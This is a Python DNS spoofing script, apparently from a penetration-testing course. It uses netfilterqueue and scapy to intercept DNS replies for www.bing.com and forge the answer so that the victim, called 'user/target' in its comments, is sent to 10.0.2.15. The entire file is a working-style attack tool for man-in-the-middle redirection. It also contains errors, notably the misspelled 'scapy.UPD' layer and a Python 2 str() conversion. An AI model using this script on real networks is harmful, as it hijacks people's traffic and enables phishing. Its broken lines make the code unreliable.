#!/usr/bin/env python
import netfilterqueue
import  scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSRR].qname
        #PY3:decode byte-objet-> string
        if "www.bing.com" in qname.decode():
        #checking for a user/target using-page!
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
            #ip to redirecting the user/target request
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UPD].chksum
            del scapy_packet[scapy.UPD].len

            packet.set_payload(str(scapy_packet))
            #packet.set_payload(bytes(scapy_packet))#Py3

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()
